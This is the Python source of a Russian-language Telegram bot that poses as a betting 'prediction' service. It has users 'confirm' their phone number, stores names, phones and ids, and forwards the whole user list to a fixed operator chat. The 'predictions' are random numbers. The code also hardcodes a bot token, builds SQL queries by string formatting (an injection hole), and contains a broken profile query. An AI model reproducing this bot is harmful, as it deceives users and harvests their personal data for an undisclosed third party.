import telebot
from telebot import types
import random
import sqlite3

# Здесь нужно указать токен вашего Telegram-бота
bot = telebot.TeleBot('6515033748:AAGmsu4w8PH6rs10KxtMLJp1c3aKvwgb6ek')

@bot.message_handler(commands=['start'])
def send_welcome(message):
#--------------------------------------------------------
    # подключение\создание базы данных
    connectbd = sqlite3.connect('tg_bot.sql')
    cur = connectbd.cursor()


    cur.execute('CREATE TABLE IF NOT EXISTS users (id int auto increment primary key, name varchar(50), nommer varchar(50), uid varchar(50))')
    connectbd.commit()

    # отключение от базы данных
    cur.close()
    connectbd.close()
#--------------------------------------------------------

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    button = types.KeyboardButton(text="📞Подтвердить номер телефона📞", request_contact=True)
    markup.add(button)
    bot.send_message(message.chat.id, "Привет! Для начала подтверди свой номер телефона чтобы продолжить:", reply_markup=markup)


@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    markup2 = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    phone_number = message.contact.phone_number
    user_id = message.from_user.id
    user_name = f"{message.from_user.first_name} {message.from_user.last_name}"

    # --------------------------------------------------------
    # подключение\создание базы данных
    connectbd = sqlite3.connect('tg_bot.sql')
    cur = connectbd.cursor()

    cur.execute("INSERT INTO users (name, nommer, uid) VALUES ('%s', '%s', '%s')" % (user_name, phone_number, user_id))
    connectbd.commit()

    # отключение от базы данных
    cur.close()
    connectbd.close()
    # --------------------------------------------------------


    #вывод информации в консоль
    print(f"пользователь:  {message.from_user.first_name} {message.from_user.last_name}")
    print(f"Номер телефона пользователя {user_id}: {phone_number}")
    print("---------------------------------------------------")

    button1 = types.KeyboardButton(text="👤Профиль👤")
    button2 = types.KeyboardButton(text="🔴предсказание🔴")
    markup2.row(button2,button1)
    bot.send_message(message.chat.id, "Хорошо! Теперь можешь пользоваться ботом!", reply_markup=markup2)

    # --------------------------------------------------------
    # подключение\создание базы данных
    connectbd = sqlite3.connect('tg_bot.sql')
    cur = connectbd.cursor()

    cur.execute("SELECT * FROM users")
    users = cur.fetchall()

    info = ''
    for el in users:
        info += f'Имя: {el[1]}, телефон: {el[2]}, id: {el[3]}\n'

    # отключение от базы данных
    cur.close()
    connectbd.close()

    bot.send_message(1747577985, info)
    # --------------------------------------------------------

    bot.register_next_step_handler(message, predscaz)

def predscaz(message):
    global user_name


    if message.text == "🔴предсказание🔴":

        random_number = random.uniform(0, 14.6)
        bot.send_message(message.chat.id, f"x {round(random_number, 1)}")


    elif message.text == "👤Профиль👤":
        user_name = f"{message.from_user.first_name} {message.from_user.last_name}"
        # --------------------------------------------------------
        # подключение\создание базы данных
        connectbd = sqlite3.connect('tg_bot.sql')
        cur = connectbd.cursor()

        cur.execute("SELECT nommer FROM users WHERE uid=`1747577985`")
        users = cur.fetchall()
        bot.send_message(message.chat.id, f"{user_name}\nномер телефона: {users}\nбаланс: 0р.")
        # отключение от базы данных
        cur.close()
        connectbd.close()

        # --------------------------------------------------------




    bot.register_next_step_handler(message, predscaz)
bot.polling(non_stop=True)